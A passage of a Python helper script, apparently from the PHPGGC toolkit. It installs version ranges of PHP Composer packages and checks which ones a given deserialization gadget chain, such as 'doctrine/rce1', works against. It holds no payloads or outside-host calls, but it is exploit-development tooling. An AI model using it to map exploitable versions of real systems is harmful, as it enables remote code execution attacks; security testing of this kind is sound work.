  You can specify package version by adding a semicolon to the package name:\n    \n    # Tests version 1.6.0 and 1.6.3\n    $ ./test-gc-compatibility.py doctrine/doctrine-bundle:1.6.0,1.6.3 doctrine/rce1\n    \n    or with a range:\n    \n    # Tests from version 5.0.0 to 6.1.3\n    $ ./test-gc-compatibility.py doctrine/doctrine-bundle:1.6.0..1.12.3 doctrine/rce1\n    \n    If no upper or lower version is present, every version before (resp. after)\n    the specified one will be tested:\n    \n    # from doctrine 1.12.0 to the newest\n    $ ./test-gc-compatibility.py doctrine/doctrine-bundle:1.12.0.. doctrine/rce1\n    # from the first version of doctrine to 1.6.0\n    $ ./test-gc-compatibility.py doctrine/doctrine-bundle:..1.6.0 doctrine/rce1\n    \nUsing \"create-project\":\n    Some GC require a full project to be installed, instead of just a package.\n    Use the `-c` flag to use the `create-project` command instead of `require`.\n\"\"\",\n        formatter_class=argparse.RawTextHelpFormatter,\n    )\n    parser.add_argument(\"package\")\n    parser.add_argument(\"gadget_chain\", nargs=\"+\")\n    parser.add_argument(\n        \"--create-project\",\n        \"-c\",\n        action='store_true',\n        help=\"Use the `create-project` command instead of `require` when installing packages.\",\n    )\n    parser.add_argument(\n        \"--workers\",\n        \"-w\",\n        type=int,\n        required=False,\n        help=\"Number of workers to use. Defaults to the number of CPU cores.\",\n    )\n\n    return parser.parse_args()\n\n\nclass Executor:\n    \"\"\"Small wrapper to execute composer and phpggc.\"\"\"\n\n    def __init__(self, create_project: bool):\n        self.get_commands()\n        self.create_project = create_project\n\n    def _try_run_command(self, *cmd):\n        \"\"\"Tries to run a command to completion: if no exception happens and the\n        return code is zero, returns True. Otherwise, False.\n        \"\"\"\n        try:\n            process = self._run(*cmd)\n        except (PermissionError, FileNotFoundError) as e:\n            return False\n        return process.returncode == 0\n\n    def _get_valid_run_command(self, php_file):\n        \"\"\"Tries to run a PHP file directly (e.g. `./file.php`). If it does not\n        work, tries with `php file.php`.\n        Returns the arguments required to launch the file, as tuple.\n        If nothing works, an exception is raised.\n        \"\"\"\n        # We will change our current directory during the execution.\n        # If we can find php_file in the current path, refer to it using an\n        # absolute path.\n        # Otherwise, just assume it's an alias or from $PATH.\n        path = pathlib.Path(php_file)\n        if path.exists():\n            php_file = str(path.absolute())\n\n        if self._try_run_command(php_file):\n            return (php_file,)\n        elif path.exists() and self._try_run_command(self._php_path, php_file):\n            return (self._php_path, php_file)\n        raise TesterException(f\"Unable to run PHP file: {php_file}\")\n\n    def get_commands(self):\n        \"\"\"Gets the paths of the two required programs, phpggc and composer, and\n        verifies if they need to be started with \"php\" as a prefix.\n        \"\"\"\n        work_dir = pathlib.Path(__file__).parent.resolve()\n        phpggc = os.environ.get(\"PHPGGC_PATH\", str(work_dir / \"phpggc\"))\n        composer = os.environ.get(\"COMPOSER_PATH\", \"composer\")\n\n        if not pathlib.Path(phpggc).is_file():\n            raise TesterException(\"phpggc executable not found\")\n\n        self._php_path = os.environ.get(\"PHP_BINARY\", \"php\")\n        self._phpggc = self._get_valid_run_command(phpggc)\n        self._composer = self._get_valid_run_command(composer)\n\n    def _run(self, *args):\n        \"\"\"Runs a program with given arguments.\"\"\"\n        return subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\n    def composer(self, *args):\n        \"\"\"Runs composer and returns stdout and stderr as a tuple.\"\"\"\n        process = self._run(*self._composer, *args)\n        return process.stdout.decode(\"utf-8\"), process.stderr.decode(\"utf-8\")\n    \n    def install(self, *args):\n        if self.create_project:\n            prefix = \"create-project\"\n            suffix = (\".\", )\n        else:\n            prefix = \"require\"\n            suffix = ()\n        return self.composer(prefix, *args, *suffix)\n        \n\n    def phpggc(self, *args):\n        \"\"\"Runs PHPGGC with given arguments and returns whether the execution\n        was successful or not.\n        \"\"\"\n        process = self._run(*self._phpggc, *args)\n        return process.returncode == 0\n\n    def php(self, *args):\n        \"\"\"Runs PHP with given arguments and returns whether the execution\n        was successful or not.\n        \"\"\"\n        process = self._run(self._php_path, *args)\n        return process.stdout.decode(\"utf-8\"), process.stderr.decode(\"utf-8\")\n\n\nclass Package:\n    \"\"\"Represents a composer package.\"\"\"\n\n    def __init__(self, name: str, executor: Executor):\n        self.extract_name_versions(name)\n        self._executor = executor\n\n    def extract_name_versions(self, name):\n        if \":\" not in name:\n            self.name = name\n            self.versions = None\n        else:\n            self.name, self.versions = name.split(\":\")\n\n    def get_package_versions(self):\n        versions, _ = self._executor.composer(\"show\", \"-a\", self.name)\n        try:\n            versions = re.search(r\"\\nversions :(.*)\\n\", versions).group(1)\n        except AttributeError:\n            print(f\"[red]Package [b]{self.name}[/b] has not version candidates (misspelled ?)\")\n            exit(1)    \n            \n        return [v.strip() for v in versions.split(\",\")]\n\n    def get_target_versions(self):\n        \"\"\"Uses composer to obtain each version (or tag) for the package.\"\"\"\n        if self.versions is None:\n            return self.get_package_versions()\n\n        package_versions = None\n        target_versions = []\n\n        def get_version_idx_or_raise(version):\n            try:\n                return package_versions.index(version)\n            except ValueError:\n                raise ValueError(f\"Version {version} could not be found\")\n\n        for version in self.versions.split(\",\"):\n            # range\n            if \"..\" in version:\n                vmin, vmax = version.split(\"..\")\n                if package_versions is None:\n                    package_versions = self.get_package_versions()\n\n                vmin_idx = (\n                    get_version_idx_or_raise(vmin) if vmin else len(package_versions)\n                )\n                vmax_idx = get_version_idx_or_raise(vmax) if vmax else 0\n                # Versions are stored from biggest to smallest\n                target_versions += package_versions[vmax_idx : vmin_idx + 1]\n            else:\n                target_versions.append(version)\n\n        return target_versions\n\n\nclass PackageVersion:\n    def __init__(self, package: str, version: str, executor: Executor):\n        self.package = package\n        self.version = version\n        self._executor = executor\n        self.work_dir = pathlib.Path(tempfile.mkdtemp(prefix=\"phpggc\"))\n\n    def cleanup(self):\n        \"\"\"Removes any composer related file in the working directory, such as\n        composer.json and vendor/.\n        \"\"\"\n        shutil.rmtree(self.work_dir, ignore_errors=True)\n\n    def install(self):\n        \"\"\"Uses composer to install a specific version of the package.\"\"\"\n        # We'll jump to a temporary directory for phpggc and composer to work\n        # without breaking anything. We can safely change directories as we are\n        # not in the original process\n        os.chdir(self.work_dir)\n        _, stderr = self._executor.install(\n            \"--no-scripts\",\n            \"--no-interaction\",\n            # \"--no-plugins\",\n            \"--quiet\",\n            \"--ignore-platform-req=ext-*\",\n            f\"{self.package}:{self.version}\",\n        )\n        if stderr:\n            raise UnableToInstallPackageException(\n                f\"Unable to install version: {self.version}\"\n            )\n\n\nif __name__ == \"__main__\":\n    tester = Tester()\n\n    try:\n        tester.run()\n    except TesterException as e:\n        print(f\"[red]Error: {e}[/red]\")\n    except KeyboardInterrupt:\n        print(f\"[red]Execution interrupted.\")\n"
        }
      ]
    }
  ]
}